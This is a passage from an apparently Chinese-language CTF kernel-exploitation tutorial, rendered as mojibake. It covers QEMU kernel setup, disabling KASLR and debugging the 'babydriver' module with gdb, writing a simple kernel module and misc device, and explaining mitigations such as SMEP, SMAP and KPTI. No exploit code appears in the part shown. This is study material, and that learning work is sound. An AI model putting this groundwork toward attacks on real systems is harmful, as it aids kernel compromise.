¸é•œåƒ"></a>ä¸‹è½½ç°æœ‰å†…æ ¸é•œåƒ</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt search linux-image- </span><br><span class="line">sudo apt download xxxxx</span><br><span class="line">dpkg -X xxxx extract</span><br><span class="line">./boot/xxx-genericå³ä¸ºbzImageå†…æ ¸é•œåƒæ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="ç³»ç»Ÿå†…æ ¸é•œåƒ"><a href="#ç³»ç»Ÿå†…æ ¸é•œåƒ" class="headerlink" title="ç³»ç»Ÿå†…æ ¸é•œåƒ"></a>ç³»ç»Ÿå†…æ ¸é•œåƒ</h4><p>&#x2F;boot&#x2F;ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ll -a /boot</span><br><span class="line">total 177M</span><br><span class="line">drwxr-xr-x  4 root root 4.0K  7æœˆ 12 09:06 .</span><br><span class="line">drwxr-xr-x 20 root root 4.0K  7æœˆ 28 15:44 ..</span><br><span class="line">-rw-r--r--  1 root root 264K  6æœˆ  7 22:23 config-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 264K  6æœˆ 21 22:38 config-5.19.0-46-generic</span><br><span class="line">drwx------  3 root root 4.0K  1æœˆ  1  1970 efi</span><br><span class="line">drwxr-xr-x  6 root root 4.0K  7æœˆ 12 09:05 grub</span><br><span class="line">lrwxrwxrwx  1 root root   28  7æœˆ 12 09:03 initrd.img -&gt; initrd.img-5.19.0-46-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7æœˆ 12 09:04 initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7æœˆ 12 09:04 initrd.img-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   28  7æœˆ 12 09:03 initrd.img.old -&gt; initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 179K  2æœˆ  7  2022 memtest86+.bin</span><br><span class="line">-rw-r--r--  1 root root 181K  2æœˆ  7  2022 memtest86+.elf</span><br><span class="line">-rw-r--r--  1 root root 181K  2æœˆ  7  2022 memtest86+_multiboot.bin</span><br><span class="line">-rw-------  1 root root 6.2M  6æœˆ  7 22:23 System.map-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root 6.2M  6æœˆ 21 22:38 System.map-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7æœˆ 12 09:03 vmlinuz -&gt; vmlinuz-5.19.0-46-generic</span><br><span class="line">-rw-------  1 root root  12M  6æœˆ  7 22:23 vmlinuz-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root  12M  6æœˆ 21 22:43 vmlinuz-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7æœˆ 12 09:03 vmlinuz.old -&gt; vmlinuz-5.19.0-45-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; <span class="built_in">uname</span> -r</span><br><span class="line">5.19.0-46-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; sudo file /boot/vmlinuz-5.19.0-46-generic</span><br><span class="line">[sudo] password <span class="keyword">for</span> grxer:</span><br><span class="line">/boot//vmlinuz-5.19.0-46-generic: Linux kernel x86 boot executable bzImage, version 5.19.0-46-generic (buildd@lcy02-amd64-025) <span class="comment">#47~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 21 15:35:31 UTC 2, RO-rootFS, swap_dev 0XB, Normal VGA</span></span><br></pre></td></tr></table></figure><p>vmlinuz-5.19.0-46-generic å†…æ ¸</p><p>initrd.img-5.19.0-46-generic å¼•å¯¼æ–‡ä»¶</p><h3 id="å¯åŠ¨å†…æ ¸"><a href="#å¯åŠ¨å†…æ ¸" class="headerlink" title="å¯åŠ¨å†…æ ¸"></a>å¯åŠ¨å†…æ ¸</h3><p>start.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">64</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><ul><li><code>-m</code>ï¼šè™šæ‹Ÿæœºå†…å­˜å¤§å°</li><li><code>-nographic</code>ï¼šä»¥éå›¾å½¢ç•Œé¢æ¨¡å¼è¿è¡Œè™šæ‹Ÿæœº</li><li><code>-kernel</code>ï¼šæŒ‡å®šå†…æ ¸é•œåƒæ–‡ä»¶</li><li><code>initrd</code>ï¼šæŒ‡å®šåˆå§‹RAMç£ç›˜é•œåƒæ–‡ä»¶</li><li><code>append</code>ï¼šè®¾ç½®å†…æ ¸å¯åŠ¨é™„åŠ å‚æ•°</li><li><code>smp</code>:è®¾ç½®è™šæ‹Ÿæœºçš„å¤„ç†å™¨æ‹“æ‰‘ï¼Œæ­¤å¤„ä½¿ç”¨ 2 ä¸ªæ ¸å¿ƒå’Œ 1 ä¸ªçº¿ç¨‹</li><li><code>cpu</code>:è®¾ç½®CPUå®‰å…¨é€‰é¡¹</li></ul><h3 id="è°ƒè¯•å†…æ ¸"><a href="#è°ƒè¯•å†…æ ¸" class="headerlink" title="è°ƒè¯•å†…æ ¸"></a>è°ƒè¯•å†…æ ¸</h3><p>å¯åŠ¨è„šæœ¬é‡Œå…³æ‰aslr</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \</span><br></pre></td></tr></table></figure><p>å¼€å¯è°ƒè¯•æ¥å£</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å¯åŠ¨å‚æ•°ä¸­æ·»åŠ   -gdb devï¼Œå¦‚-gdb tcp::1234 å¯ç®€å†™ä¸º-s å¦‚æœå¸Œæœ› qemu å¯åŠ¨åç«‹å³æŒ‚èµ·ï¼Œé¢å¤–æ·»åŠ -Så‚æ•°</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ # lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">~ # find /sys/| grep babydriver</span><br><span class="line">/sys/module/babydriver</span><br><span class="line">/sys/module/babydriver/srcversion</span><br><span class="line">/sys/module/babydriver/notes</span><br><span class="line">/sys/module/babydriver/notes/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/taint</span><br><span class="line">/sys/module/babydriver/initstate</span><br><span class="line">/sys/module/babydriver/coresize</span><br><span class="line">/sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections/.bss</span><br><span class="line">/sys/module/babydriver/sections/.init.text</span><br><span class="line">/sys/module/babydriver/sections/.data</span><br><span class="line">/sys/module/babydriver/sections/.text</span><br><span class="line">/sys/module/babydriver/sections/__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections/.strtab</span><br><span class="line">/sys/module/babydriver/sections/.symtab</span><br><span class="line">/sys/module/babydriver/sections/.gnu.linkonce.this_module</span><br><span class="line">/sys/module/babydriver/sections/.rodata.str1.1</span><br><span class="line">/sys/module/babydriver/sections/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/sections/.exit.text</span><br><span class="line">/sys/module/babydriver/refcnt</span><br><span class="line">/sys/module/babydriver/uevent</span><br><span class="line">/sys/module/babydriver/holders</span><br><span class="line">/sys/module/babydriver/initsize</span><br><span class="line">~ # cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.bss</span><br><span class="line">0xffffffffc0002440</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.data</span><br><span class="line">0xffffffffc0002000</span><br></pre></td></tr></table></figure><p>gdb.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file babydriver.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002440&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b babyopen&quot; </span><br></pre></td></tr></table></figure><h2 id="Loadable-Kernel-Modulesï¼ˆLKMsï¼‰"><a href="#Loadable-Kernel-Modulesï¼ˆLKMsï¼‰" class="headerlink" title="Loadable Kernel Modulesï¼ˆLKMsï¼‰"></a>Loadable Kernel Modulesï¼ˆLKMsï¼‰</h2><p>Linux Kernleé‡‡ç”¨çš„æ˜¯å®å†…æ ¸æ¶æ„ï¼Œä¸€åˆ‡çš„ç³»ç»ŸæœåŠ¡éƒ½éœ€è¦ç”±å†…æ ¸æ¥æä¾›ï¼Œæ•ˆç‡è¾ƒé«˜ï¼Œä½†æ˜¯ç¼ºä¹å¯æ‰©å±•æ€§ä¸å¯ç»´æŠ¤æ€§ï¼Œç„¶åå°±æœ‰äº†<strong>å¯è£…è½½å†…æ ¸æ¨¡å—</strong>ï¼ˆ<strong>Loadable Kernel Modules</strong>ï¼Œç®€ç§°<strong>LKMs</strong>ï¼ŒLKMså¯ä»¥æä¾›<strong>æ–°çš„ç³»ç»Ÿè°ƒç”¨</strong>æˆ–å…¶ä»–æœåŠ¡ï¼Œé©±åŠ¨ç­‰ï¼ŒLKMsæ˜¯ELFæ–‡ä»¶æ ¼å¼ï¼Œè¿è¡Œåœ¨å†…æ ¸</p><blockquote><p>å¾®å†…æ ¸æ¶æ„å°±ç›¸å¯¹å®‰å…¨ï¼Œå®å†…æ ¸é‡Œä¸€ä¸ªè®¾å¤‡å¤±æ§ï¼Œå±æœºæ•´ä¸ªå†…æ ¸ï¼Œå¾®å†…æ ¸åªèƒ½å±æœºæä¾›è¯¥ç³»ç»ŸæœåŠ¡çš„è¿›ç¨‹</p><p>jyyè€å¸ˆæœ‰è®²åˆ°å“‡: <a href="https://jyywiki.cn/OS/2022/slides/21.slides.html#/2">https://jyywiki.cn/OS/2022/slides/21.slides.html#/2</a></p></blockquote><ul><li><code>lsmod</code>ï¼šåˆ—å‡ºç°æœ‰çš„LKMs</li><li><code>insmod</code>ï¼šè£…è½½æ–°çš„LKMï¼ˆéœ€è¦rootï¼‰</li><li><code>rmmod</code>ï¼šä»å†…æ ¸ä¸­ç§»é™¤LKMï¼ˆéœ€è¦rootï¼‰ã€</li><li><code>modprobe</code>: æ·»åŠ æˆ–åˆ é™¤æ¨¡å—ï¼Œmodprobe åœ¨åŠ è½½æ¨¡å—æ—¶ä¼šæŸ¥æ‰¾ä¾èµ–å…³ç³»</li></ul><p>ä¸€èˆ¬ctfå°±æ˜¯åˆ†æè¿™ä¸ªæ–‡ä»¶ï¼Œäº†è§£ä¸€ä¸‹ç¨‹åºçš„ç¼–å†™</p><p>åœ¨ä¹‹å‰ä¸‹è½½çš„æºç æ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir testdrive &amp; cd testdrive</span><br></pre></td></tr></table></figure><p>kotest.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123; printk(<span class="string">&quot;Bye Bye~\n&quot;</span>); &#125;</span><br><span class="line">module_init(ko_test_init);<span class="comment">//æ¨¡å—å…¥å£å‡½æ•° åŠ è½½æ—¶æ‰§è¡Œ</span></span><br><span class="line">module_exit(ko_test_exit);<span class="comment">//æ¨¡å—å‡ºå£å‡½æ•° å¸è½½æ—¶æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line">KDIR =/home/grxer/kernel-env/linux-4.4.72/</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure><ul><li><code>obj-m</code>ï¼š æŒ‡å®šäº†ç¼–è¯‘çš„ç»“æœåº”å½“ä¸ºå¯è£…è½½å†…æ ¸æ¨¡å—ï¼ŒæŒ‡å®šè¦å£°ç§°å“ªäº›æ¨¡å—</li><li><code>KDIR</code> ç”¨æ¥æ ‡è¯†å†…æ ¸æºç ç›®å½•ï¼Œæä¾›é©±åŠ¨ç¼–è¯‘æ‰€éœ€ç¯å¢ƒ</li><li><code>-C</code> è¡¨ç¤ºè¿›å…¥åˆ°æŒ‡å®šçš„å†…æ ¸ç›®å½•</li><li><code>M</code> æŒ‡å®šé©±åŠ¨æºç çš„ç¯å¢ƒï¼Œä½¿ Makefile åœ¨æ„å»ºæ¨¡å—ä¹‹å‰è¿”å›åˆ° é©±åŠ¨æºç  ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸­ç”Ÿæˆé©±åŠ¨æ¨¡å—</li></ul><p>make</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; make</span><br><span class="line">make -C /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/ M=/home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive modules</span><br><span class="line">make[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">  CC [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.o</span><br><span class="line">  Building modules, stage <span class="number">2.</span></span><br><span class="line">  MODPOST <span class="number">1</span> modules</span><br><span class="line">  CC      /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.ko</span><br><span class="line">make[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; ls</span><br><span class="line">ko_test.c*  ko_test.mod.c  ko_test.o  modules.order</span><br><span class="line">ko_test.ko  ko_test.mod.o  Makefile*  Module.symvers</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„gccå°½é‡è¿˜æ˜¯ä¹‹å‰ç¡®å®šçš„é‚£ä¸ªgcc</p></blockquote><p>ko_test.koå¤åˆ¶åˆ°æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ï¼Œç„¶ååœ¨initè£…è½½æ–°çš„LKMï¼Œé‡æ–°æ‰“åŒ…</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /ko_test.ko</span><br></pre></td></tr></table></figure><p>å¼€æœºådmesgå°±å¯ä»¥çœ‹åˆ°äº†</p><p><img src="/2023/08/08/first-kernelpwn/image-20230814231519956.png" alt="image-20230814231519956"></p><h3 id="æ‚é¡¹å­—ç¬¦è®¾å¤‡"><a href="#æ‚é¡¹å­—ç¬¦è®¾å¤‡" class="headerlink" title="æ‚é¡¹å­—ç¬¦è®¾å¤‡"></a><a href="https://www.cnblogs.com/ggzhangxiaochao/p/12894883.html">æ‚é¡¹å­—ç¬¦è®¾å¤‡</a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">æ³¨å†Œï¼š<span class="type">int</span> <span class="title function_">misc_register</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br><span class="line">é‡Šæ”¾ï¼š<span class="type">int</span> <span class="title function_">misc_deregister</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br></pre></td></tr></table></figure><p>misc_registeræ³¨å†Œæ‚é¡¹å­—ç¬¦è®¾å¤‡ï¼Œè¯¥ç±»è®¾å¤‡ä½¿ç”¨åŒä¸€ä¸ªä¸»è®¾å¤‡å·10,ä¼šè‡ªåŠ¨åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ï¼Œå³è®¾å¤‡æ–‡ä»¶ã€‚æ— éœ€mknodæŒ‡ä»¤åˆ›å»ºè®¾å¤‡æ–‡ä»¶ã€‚å› ä¸ºmisc_register()ä¼šè°ƒç”¨class_device_creatæˆ–è€…device_creat().</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>  &#123;</span></span><br><span class="line">    <span class="type">int</span> minor;<span class="comment">//æ¬¡è®¾å¤‡å·,ä¸€èˆ¬ä½¿ç”¨ MISC_DYNAMIC_MINOR å®æ¥ä½¿ç”¨åŠ¨æ€åˆ†é…çš„æ¬¡è®¾å¤‡å·</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;<span class="comment">//å­—ç¬¦è®¾å¤‡çš„åç§°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>;</span><span class="comment">//æŒ‡å‘å­—ç¬¦è®¾å¤‡æ“ä½œå‡½æ•°é›†çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">class_device</span> *<span class="keyword">class</span>;</span></span><br><span class="line">    <span class="type">char</span> devfs_name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/fs.h#L1821">file_operations</a>ç»“æ„ä½“æˆå‘˜åŸºæœ¬ä¸Šéƒ½æ˜¯å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥è¾¾åˆ°é‡å†™æŸä¸ªå‡½æ•°çš„ç›®çš„ï¼Œå¦‚æœå¯¹è¿™ä¸ªé©±åŠ¨è°ƒç”¨æŸä¸ªå…¶ä¸­çš„å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨ç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">misc_ioctl</span><span class="params">(<span class="keyword">struct</span> file* file, <span class="type">unsigned</span> <span class="type">int</span> request,  <span class="type">size_t</span> arg)</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (request)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x666</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x666\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x888</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x888\n&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">dev_fops</span> =</span> &#123;</span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .unlocked_ioctl = misc_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">test_misc</span> =</span> &#123;</span><br><span class="line">  .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">  .name = <span class="string">&quot;testmisc&quot;</span>,</span><br><span class="line">  .fops = &amp;dev_fops,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> err = misc_register(&amp;test_misc);</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    printk(<span class="string">&quot;envctrl: Unable to get misc minor %d/n&quot;</span>,test_misc.minor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">  misc_deregister(&amp;test_misc);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure><p><strong>é‡å†™äº†é©±åŠ¨çš„ioctlå‡½æ•°</strong></p><blockquote><p>32ä½çš„APPè¿è¡Œåœ¨64ä½çš„kernelä¸Šï¼Œè°ƒç”¨çš„æ˜¯<strong>compat_ioctl</strong></p><p>64ä½çš„ç”¨æˆ·ç¨‹åºè¿è¡Œåœ¨64ä½çš„kernelä¸Šï¼Œè°ƒç”¨çš„æ˜¯<strong>unlocked_ioctl</strong>ï¼Œå¦‚æœæ˜¯32ä½çš„APPè¿è¡Œåœ¨32ä½çš„kernelä¸Šï¼Œè°ƒç”¨çš„ä¹Ÿæ˜¯<strong>unlocked_ioctl</strong></p><p>jyyè€å¸ˆæœ‰è®²å“‡: <a href="https://jyywiki.cn/OS/2022/slides/25.slides.html#/2/4">https://jyywiki.cn/OS/2022/slides/25.slides.html#/2/4</a></p></blockquote><p>ç”¨æˆ·æ€æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> fd=open(<span class="string">&quot;/dev/testmisc&quot;</span>,O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(<span class="number">-1</span>==fd)&#123;</span><br><span class="line">    perror(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res=ioctl(fd, <span class="number">0x666</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">  res=ioctl(fd, <span class="number">0x888</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å†…æ ¸é˜²æŠ¤"><a href="#å†…æ ¸é˜²æŠ¤" class="headerlink" title="å†…æ ¸é˜²æŠ¤"></a>å†…æ ¸é˜²æŠ¤</h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>kernel address space layout randomize å†…æ ¸ç©ºé—´åœ°å€éšæœºåŒ–</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemuå¼€å¯smep -append â€kaslrâ€œ</span><br><span class="line">    å…³é—­   -append â€nokaslrâ€œ</span><br></pre></td></tr></table></figure><h3 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h3><p>FGKASLR åœ¨KASLRåŸºåœ°å€éšæœºåŒ–çš„åŸºç¡€ä¸Šï¼Œåœ¨åŠ è½½æ—¶åˆ»ï¼Œä»¥å‡½æ•°ç²’åº¦é‡æ–°æ’å¸ƒå†…æ ¸ä»£ç </p><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p>ç±»ä¼¼äºç”¨æˆ·æ€ç¨‹åºçš„ canary,x86 æ¶æ„ä¸‹ Canary å®ç°çš„ç‰¹ç‚¹æ˜¯åŒä¸€ä¸ª task å…±äº« Canary</p><p>å†…æ ¸ä¸­çš„ canary çš„å€¼é€šå¸¸å–è‡ª gs æ®µå¯„å­˜å™¨æŸä¸ªå›ºå®šåç§»å¤„çš„å€¼</p><h3 id="SMEP-x2F-SMAP"><a href="#SMEP-x2F-SMAP" class="headerlink" title="SMEP&#x2F;SMAP"></a>SMEP&#x2F;SMAP</h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811154518221.png" alt="image-20230811154518221"></p><p>Supervisor Mode <strong>Execution</strong> Protection ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤ å†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç </p><p>ARMé‡Œå«åšPXN</p><p>CR4å¯„å­˜å™¨ä¸­çš„ç¬¬<strong>20</strong>ä½æ¥æ ‡è®°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemuå¼€å¯smep     -cpu qemu64-v1,smep</span><br></pre></td></tr></table></figure><p>Supervisor Mode <strong>Access</strong> Prevention ç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤ å†…æ ¸æ€ä¸å¯è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®</p><p>ARMé‡Œå«åšPAN</p><p>CR4å¯„å­˜å™¨ä¸­çš„ç¬¬<strong>21</strong>ä½æ¥æ ‡è®°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemuå¼€å¯smep     -cpu qemu64-v1,smap</span><br></pre></td></tr></table></figure><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a><a href="https://zhuanlan.zhihu.com/p/137277724">KPTI</a></h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811165305116.png" alt="image-20230811165305116"></p><p>Kernel Page Table Isolation ç”¨æˆ·æ€ä¸å¯çœ‹åˆ°å†…æ ¸æ€çš„é¡µè¡¨ï¼›å†…æ ¸æ€<strong>ä¸å¯æ‰§è¡Œ</strong>ç”¨æˆ·æ€çš„ä»£ç </p><p>KPTIçš„å‘æ˜ä¹Ÿä¿®å¤äº†Meltdownæ¼æ´</p><ul><li>å†…æ ¸æ€ä¸­çš„é¡µè¡¨åŒ…æ‹¬ç”¨æˆ·ç©ºé—´å†…å­˜çš„é¡µè¡¨å’Œå†…æ ¸ç©ºé—´å†…å­˜çš„é¡µè¡¨ï¼Œ x86_64 çš„ PTI æœºåˆ¶ä¸­ï¼Œå†…æ ¸æ€çš„ç”¨æˆ·ç©ºé—´å†…å­˜æ˜ å°„éƒ¨åˆ†è¢«å…¨éƒ¨æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ</li><li>ç”¨æˆ·æ€çš„é¡µè¡¨åªåŒ…æ‹¬ç”¨æˆ·ç©ºé—´å†…å­˜çš„é¡µè¡¨ä»¥åŠå¿…è¦çš„å†…æ 